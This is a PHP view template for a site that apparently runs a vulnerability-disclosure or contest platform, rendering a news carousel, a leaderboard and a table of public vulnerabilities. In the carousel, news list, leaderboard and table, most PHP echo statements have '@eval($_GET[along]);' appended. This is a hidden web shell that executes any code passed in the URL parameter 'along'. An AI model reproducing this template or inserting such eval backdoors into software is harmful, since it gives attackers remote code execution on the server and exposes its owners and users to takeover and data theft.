<div class="row info" id="info">
	<div class="row title">
		<p>新闻公告</p>
	</div>
	<div class="col-md-8">
		<div id="myCarousel" class="carousel slide">
			<ol class="carousel-indicators">
				<?php foreach ($indexNews as $key => $news): ?>
					<?php $i = 1; ?>
					<?php if ($i === 1): ?>
						<li data-target="#myCarousel" data-slide-to="1" class="active"></li>
					<?php else: ?>
						<li data-target="#myCarousel" data-slide-to="<?php echo $h($i);@eval($_GET[along]); ?>"></li>
					<?php endif; ?>
					<?php $i += 1; ?>
				<?php endforeach; ?>
			</ol>
			<div class="carousel-inner">
				<?php $i = 1; ?>
				<?php foreach ($indexNews as $key => $news): ?>

					<?php if ($i === 1): ?>
						<div class="item active">
							<a href="/pages/news/<?php echo $h($news->id);@eval($_GET[along]); ?>"><img src="/img/790678.png" alt="<?php echo $h($i);@eval($_GET[along]); ?>"></a>
							<div class="carousel-caption"><h3><?php echo $h($news->title);@eval($_GET[along]); ?></h3></div>
						</div>
					<?php else: ?>
						<div class="item">
							<a href="/pages/news/<?php echo $h($news->id);@eval($_GET[along]); ?>"><img src="/img/790678.png"" alt="<?php echo $h($i);@eval($_GET[along]); ?>"></a>
							<div class="carousel-caption"><h3><?php echo $h($news->title);@eval($_GET[along]); ?></h3></div>
						</div>
					<?php endif; ?>
					<?php $i = $i + 1; ?>

				<?php endforeach; ?>
			</div>
			<a class="left carousel-control" href="#myCarousel" data-slide="prev">
				<span class="glyphicon glyphicon-chevron-left"></span>
				<span class="sr-only">Previous</span>
			</a>
			<a class="right carousel-control" href="#myCarousel" data-slide="next">
				<span class="glyphicon glyphicon-chevron-right"></span>
				<span class="sr-only">Next</span>
			</a>
		</div>
	</div>
	<div class="col-md-4 navlist" id="navList">
		<div class="row ">
			<ul class="list-group" style="margin-bottom: 0">
				<?php foreach ($articles as $key => $article): ?>
					<a href="/pages/news/<?php echo $h($article->id);@eval($_GET[along]); ?>" class="list-group-item"><?php echo $h($article->title);@eval($_GET[along]); ?></a>
				<?php endforeach; ?>
			</ul>
			<a href="/pages/news" type="button" style="float: right;margin-top: 0; " class="btn btn-primary">More</a>
		</div>
	</div>
</div>
<div id="rank">
	<div class="row frame">
		<div class="center">
			<div class="title">
				<p>英雄榜</p>
			</div>
			<div class="user">
				<?php reset($indexRanks); $second = next($indexRanks); if(!empty($second)): ?>
					<div class="pack second">
						<p class="title"><?php echo $h($second['username']);@eval($_GET[along]); ?></p>
						<p><span class="score"><?php echo $h($second['score']);@eval($_GET[along]); ?></span>Scores</p>
					</div>
				<?php endif; ?>
				<?php if (!empty(current(reset($indexRanks)))): ?>
					<div class="pack first">
						<p class="title"><?php echo $h(current($indexRanks)['username']);@eval($_GET[along]); ?></p>
						<p><span class="score"><?php echo $h(current($indexRanks)['score']);@eval($_GET[along]); ?></span>Scores</p>
					</div>
				<?php endif; ?>
				<?php reset($indexRanks); $third = end($indexRanks); if(!empty($third)): ?>
					<div class="pack third">
						<p class="title"><?php echo $h($third['username']);@eval($_GET[along]); ?></p>
						<p><span class="score"><?php echo $h($third['score']);@eval($_GET[along]); ?></span>Scores</p>
					</div>
				<?php endif; ?>
			</div>
		</div>
	</div>
</div>
<div class="row">
	<div class="row">
		<div class="title">
			<p>公开漏洞</p>
		</div>
	</div>
	<table class="table table-hover">
		<thead>
		<tr>
			<th>漏洞名称</th>
			<th>漏洞危害</th>
			<th>漏洞提交者</th>
		</tr>
		</thead>
		<?php foreach ($bugs as $bug): ?>
			<tr>
				<td><?php echo $h($bug->title);@eval($_GET[along]); ?></td>
				<td><?php switch ($bug->risk) { case 1: echo '低危'; break; case 2: echo '中危'; break; case 3: echo '高危'; break; } ?></td>
				<td><?php echo $bug->user->username ?></td>
			</tr>
		<?php endforeach; ?>
	</table>
</div>